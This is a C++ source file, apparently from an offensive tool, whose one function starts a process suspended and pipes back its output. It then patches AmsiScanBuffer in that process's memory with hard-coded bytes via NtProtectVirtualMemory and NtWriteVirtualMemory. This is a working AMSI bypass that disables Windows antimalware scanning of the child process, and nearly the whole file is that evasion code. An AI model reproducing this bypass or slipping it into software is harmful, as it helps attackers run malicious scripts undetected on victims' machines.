#include "evasion.h"
#include "base64.h"
#include <windows.h>
#include <iostream>

PROCESS_INFO* evasion::create_process(wchar_t cmd[]) {

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    NtProtectVirtualMemoryFunctionPointer NtProtectVirtualMemory = (NtProtectVirtualMemoryFunctionPointer)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtWriteVirtualMemoryFunctionPointer NtWriteVirtualMemory = (NtWriteVirtualMemoryFunctionPointer)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    LPSTARTUPINFOW si = new STARTUPINFOW();


    SECURITY_ATTRIBUTES saAttr;

    ZeroMemory(&saAttr, sizeof(saAttr));
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE m_hChildStd_OUT_Rd = NULL;
    HANDLE m_hChildStd_OUT_Wr = NULL;

    if (!CreatePipe(&m_hChildStd_OUT_Rd, &m_hChildStd_OUT_Wr, &saAttr, 0))
    {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return NULL;
    }

    if (!SetHandleInformation(m_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return NULL;
    }

    HANDLE hProc = NULL;

    ZeroMemory(si, sizeof(STARTUPINFO));
    si->cb = sizeof(STARTUPINFO);
    si->hStdError = m_hChildStd_OUT_Wr;
    si->hStdOutput = m_hChildStd_OUT_Wr;
    si->dwFlags |= STARTF_USESTDHANDLES;

    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));

    CreateProcess(
        NULL,
        cmd, // the actual process
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        si,
        pi
    );
    hProc = pi->hProcess;

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;

    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);


    PROCESS_INFO* process_info = new PROCESS_INFO;
    process_info->pi = pi;
    process_info->stdOutRd = m_hChildStd_OUT_Rd;

    CloseHandle(m_hChildStd_OUT_Wr);


    return process_info;
}